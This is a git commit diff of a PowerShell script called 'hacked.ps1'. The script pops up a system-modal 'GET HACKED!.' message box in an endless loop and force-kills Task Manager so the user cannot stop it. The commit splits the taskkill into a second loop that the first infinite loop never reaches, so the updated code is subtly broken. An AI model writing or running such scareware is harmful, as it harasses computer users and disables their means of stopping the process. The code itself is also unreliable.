fe9929ac03d31980392949b88eb62aa574a07bbb
creepyturnip <92087207+creepyturnip@users.noreply.github.com>
2023-05-17 16:11:28 +0200

    Update hacked.ps1

--- hacked.ps1
+++ hacked.ps1
@@ -1,5 +1,8 @@
 [void] [System.Reflection.Assembly]::LoadWithPartialName("Microsoft.VisualBasic") 
 
 while (1) {
-[Microsoft.VisualBasic.Interaction]::MsgBox("GET HACKED!.", "OKOnly,SystemModal,Critical", "eZZZZZ"); taskkill /IM taskmgr.exe /F
+[Microsoft.VisualBasic.Interaction]::MsgBox("GET HACKED!.", "OKOnly,SystemModal,Critical", "eZZZZZ")
+}
+while (2){
+taskkill /IM taskmgr.exe /F
 }
